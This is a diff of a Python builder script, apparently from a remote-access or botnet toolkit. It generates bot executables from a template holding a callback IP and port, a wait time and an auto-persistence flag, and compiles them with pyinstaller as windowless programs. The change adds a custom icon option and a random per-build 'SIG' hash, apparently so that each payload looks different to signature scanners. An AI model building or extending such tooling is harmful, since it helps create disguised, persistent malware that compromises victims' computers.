@@ -2,11 +2,13 @@
 # Author: Pure-L0G1C
 # Description: Execute creator
 
-from os import remove
 from os.path import sep 
 from lib.file import File
 from lib.args import Args 
+from random import choice
+from hashlib import sha256 
 from subprocess import Popen
+from os import remove, urandom
 
 # pyinstaller
 try:
@@ -18,12 +20,13 @@ except:
 
 class Executor(object):
 
- def __init__(self, ip, port, filename, delay, wait, exe, hide, persist):
+ def __init__(self, ip, port, filename, delay, wait, exe, icon, hide, persist):
   self.ip = ip 
   self.exe = exe
   self.port = port 
   self.hide = hide
   self.wait = wait 
+  self.icon = icon
   self.binary = b''
   self.delay = delay
   self.persist = persist 
@@ -42,7 +45,7 @@ class Executor(object):
   return data 
 
  def compile_file(self, path):
-  cmd = 'pyinstaller -F -w {}'.format(path)
+  cmd = 'pyinstaller -F -w {} {}'.format('' if not self.icon else '-i {}'.format(self.icon), path) 
   Popen(cmd.split()).wait()
 
  def write_template(self, template, py_temp, _dict):
@@ -59,7 +62,8 @@ class Executor(object):
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'wait_time': str(self.wait),
-           'auto_persist': repr(self.persist)
+           'auto_persist': repr(self.persist),
+           'SIG': repr(sha256(urandom(choice([0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000]))).digest().hex())
   }
 
   self.write_template(self.bot_template, self.bot_py_temp, _dict)
@@ -92,7 +96,7 @@ class Executor(object):
 if __name__ == '__main__':
  args = Args()
  if args.set_args():
-  executor = Executor(args.ip, args.port, args.name, args.delay, args.wait, args.type, args.hide, args.persist)
+  executor = Executor(args.ip, args.port, args.name, args.delay, args.wait, args.type, args.icon, args.hide, args.persist)
   
   executor.start()
   Popen('cls' if is_win else 'clear', shell=True).wait()
